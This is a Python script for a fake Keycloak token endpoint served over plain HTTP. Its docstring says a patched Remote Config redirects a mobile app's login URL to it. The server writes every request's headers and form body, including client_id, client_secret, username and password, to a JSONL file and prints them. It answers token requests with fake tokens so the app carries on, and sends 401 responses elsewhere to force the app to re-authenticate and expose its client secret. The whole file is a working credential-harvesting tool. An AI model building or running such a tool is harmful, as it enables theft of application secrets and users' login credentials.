"""Plain-HTTP logger standing in for the Keycloak token endpoint.

The patched Remote Config points `in_store_offers_keycloak_login_url` at this
server, so the app's token request (with client_id / client_secret / username /
password in the form body) arrives unencrypted and is written to a JSONL file.
"""
from __future__ import annotations

import json
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

LOG = Path(r"C:\Android\capture\token_requests.jsonl")
PORT = 9999


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _record(self) -> dict:
        length = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(length) if length else b""
        entry = {
            "ts": time.strftime("%Y-%m-%dT%H:%M:%S"),
            "method": self.command,
            "path": self.path,
            "headers": dict(self.headers),
            "body": body.decode("utf-8", "replace"),
        }
        if body:
            try:
                entry["form"] = dict(urllib.parse.parse_qsl(body.decode("utf-8", "replace")))
            except Exception:  # noqa: BLE001
                pass
        LOG.parent.mkdir(parents=True, exist_ok=True)
        with LOG.open("a", encoding="utf-8") as fh:
            fh.write(json.dumps(entry, ensure_ascii=False) + "\n")
        print("== capturado ==", self.command, self.path, flush=True)
        if entry.get("form"):
            for key, value in entry["form"].items():
                print(f"   {key} = {value}", flush=True)
        return entry

    def _respond(self, payload: dict, status: int = 200) -> None:
        data = json.dumps(payload).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_POST(self) -> None:  # noqa: N802
        entry = self._record()
        body = entry.get("body") or ""
        is_token_request = "grant_type" in body or "openid-connect" in self.path or "token" in self.path
        if is_token_request:
            # answer like Keycloak so the app can continue
            self._respond(
                {
                    "access_token": "logged-token",
                    "expires_in": 300,
                    "refresh_expires_in": 1800,
                    "refresh_token": "logged-refresh",
                    "token_type": "Bearer",
                    "scope": "R-OfertasMobile-externo",
                }
            )
            return
        # everything else: force the app to authenticate so we can see its
        # Keycloak token request (that is where the client_secret travels)
        self._respond({"error": "unauthorized", "error_description": "logged"}, status=401)

    def do_GET(self) -> None:  # noqa: N802
        self._record()
        self._respond({"error": "unauthorized", "error_description": "logged"}, status=401)

    def log_message(self, *args) -> None:  # silence the default access log
        return


if __name__ == "__main__":
    LOG.unlink(missing_ok=True)
    print(f"logger ouvindo em 0.0.0.0:{PORT} -> {LOG}", flush=True)
    ThreadingHTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
